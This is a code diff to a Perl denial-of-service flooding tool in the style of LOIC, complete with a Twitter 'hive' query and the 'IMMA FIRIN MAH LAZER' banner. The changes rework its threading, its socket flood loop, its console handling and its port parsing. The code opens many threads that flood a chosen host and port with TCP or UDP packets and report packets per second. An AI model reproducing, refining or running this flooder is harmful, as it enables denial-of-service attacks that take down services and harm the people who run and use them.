@@ -9,12 +9,15 @@
 
 use strict;
 use warnings;
+use threads;
+use threads::shared;
 use Term::ReadKey qw(ReadMode);
 use IO::Socket::INET;
 use Socket qw(IPPROTO_TCP TCP_NODELAY);
 use Number::Format;
 use Getopt::Long;
-use Config;
+
+require POSIX unless $^O !~/linux|darwin/;
 
 # Curses::UI and Term::Screen fail to compile for ActiveState Perl
 use Games::Roguelike::Console;
@@ -37,25 +40,17 @@ sub usage {
 	exit 1;
 }
 
-srand;
-
 $SIG{PIPE} = 'IGNORE'; # ignore broken pipes
 
-our $con;
+srand;
 
-our $THREADS = 0;
-if ($Config{usethreads}) {
-	use threads;
-	use threads::shared;
-	$THREADS = 1;
-}
+our $con;
+our $message :shared;
 
 our $HIVE_QUERY = "http://search.twitter.com/search.atom?q=loic";
 our $TCP_TIMEOUT = 9001; # sec
 our $MAX_THREADS = 10;
 our $PACKETS :shared = 0;
-
-our $STAT_INTERVAL = 5; # sec
 our $FORMATTER = new Number::Format;
 
 our $tcp = 1;
@@ -82,7 +77,7 @@ my $result = GetOptions(
 
 		$host = shift @parts;
 
-		if ($#parts == 1) {
+		if ($#parts == 0) {
 			$port = shift @parts;
 			usage unless $port > 0 && $port < 65536;
 		}
@@ -93,11 +88,13 @@ usage unless $result;
 
 usage unless ($host ne "" && $port); # until hive functionality is added
 
+our $alive :shared = 1;
+
 sub flood {
 	my $sock;
 
-	while (1) {
-		if ((!defined $sock) || !$sock) {
+	while ($alive) {
+		if (!defined $sock || !$sock) {
 		    $sock = new IO::Socket::INET(
 				PeerAddr => $host,
 				PeerPort => $port,
@@ -107,8 +104,8 @@ sub flood {
 			);
 		}
 
-		if (defined $sock && $sock) {
-			my $payload;
+		if ($sock) {
+			my $payload="";
 
 			if ($tcp) {
 				setsockopt $sock, IPPROTO_TCP, TCP_NODELAY, 1;
@@ -134,28 +131,56 @@ sub flood {
 	}
 }
 
+
 # Games::Rogulelike and Curses do not quit properly.
-sub reset_signals {
-	$SIG{INT} = sub {
-		undef $con;
+sub restore_console {
+	$alive = 0;
 
-		# Allow terminal echo
-		if ($^O =~ /linux|darwin/) {
-			my $tty = POSIX::ttyname(1);
+	undef $con unless (!defined $con);
 
-			if ($^O =~ /darwin/) {
-				system "stty -f $tty icanon echo";
-			}
-			else {
-				system "stty -F $tty icanon echo";
-			}
+	# Allow terminal echo
+	if ($^O =~ /linux|darwin/) {
+		my $tty = POSIX::ttyname(1);
 
-			# Show the cursor
-			print "\e[?25h";
+		# Restore POSIX terminal
+		#
+		# icanon handles special characters
+		# echo displays typed keys
+		# iutf8 allows history
+		#
+		if ($^O =~ /darwin/) {
+			system "stty -f $tty icanon echo iutf8";
+		}
+		else {
+			system "stty -F $tty icanon echo iutf8";
 		}
 
-		exit 0;
-	};
+		# Show the cursor
+		print "\e[?25h";
+	}
+}
+
+sub safe_addstr {
+	my $x = shift @_;
+	my $y = shift @_;
+	my $str = shift @_;
+
+	$con->addstr($x, $y, $str) unless (!defined $con);
+}
+
+sub safe_refresh {
+	$con->refresh unless (!defined $con);
+}
+
+sub blargh {
+	my $m = "BLAAAAAAAAAARGH!";
+
+	$m = shift @_ unless ($#_ != 0);
+
+	safe_addstr(2, 2, uc($m));
+	safe_refresh;
+
+	#print $m . "\n"; # debugging
 }
 
 sub shoop {
@@ -167,61 +192,47 @@ sub shoop {
 		$con = Games::Roguelike::Console->new;
 	}
 
-	# Force hide the cursor
-	if ($^O =~ /linux|darwin/) {
-		print "\e[?25l";
-	}
-
-	reset_signals;
+	# Force hide the cursor for *nix
+	print "\e[?25l" unless ($^O !~ /linux|darwin/);
 
 	my $width = $con->{winx};
 	
-	my $filler = "~" x ($width - 5);
+	my $filler = "~" x ($width - 3);
 
-	$con->addch(0, 1, "O");
-	$con->addch(0, 2, "_");
-	$con->addch(0, 3, "o");
-	$con->addch(1, 1, "/");
-	$con->addch(2, 0, "|");
-	$con->addch(3, 1, "\\_");
-	$con->addch(2, 2, "IMMA\' FIRIN\' MAH LAZER!");
-	$con->addch(5, 0, "Press Control+C to quit.");
-	$con->refresh;
+	$SIG{INT} = \&restore_console;
+
+	safe_addstr(0, 1, "O");
+	safe_addstr(0, 2, "_");
+	safe_addstr(0, 3, "o");
+	safe_addstr(1, 1, "/");
+	safe_addstr(2, 0, "|");
+	safe_addstr(3, 1, "\\_");
+	blargh "IMMA\' FIRIN\' MAH LAZER!";
+	safe_addstr(5, 0, "Press Control+C to quit.");
+	safe_refresh;
 
 	my $startt = time;
 
-	if ($THREADS) {
-		map { my $t = threads->create(\&flood); $t->detach; } 1..$MAX_THREADS;
-	}
-	else {
-		flood;
-	}
+	map { my $t = threads->create(\&flood); $t->detach; } 1..$MAX_THREADS;
 
 	my $interval = 0;
 
 	my $pps = 0;
-	my $message = "IMMA\' FIRIN\' MAH LAZER!";
 
-	while (1) {
+	while ($alive && $interval < 1) { $interval = time - $startt; }
+
+	safe_addstr(1, 3, $filler);
+	safe_addstr(3, 3, $filler);
+	safe_refresh;
+
+	while ($alive) {
 		$interval = time - $startt;
 
-		if ($interval < 3) {}
-		elsif ($PACKETS < 3) {
-			$message = "FAILED TO CONNECT TO $host:$port";
-		}
-		else {
-			$con->addch(1, 3, $filler);
-			$con->addch(3, 3, $filler);
-
+		if ($interval > 1) {
 			$pps = $FORMATTER->format_number(int($PACKETS / $interval));
-			$message = "SENDING $host $pps PACKETS/SEC\n";
+			blargh "SENDING $pps PACKETS/SEC";
 		}
-
-		$con->addch(2, 2, uc $message);
-		$con->refresh;
 	}
-
-	undef $con;
 }
 
 shoop;
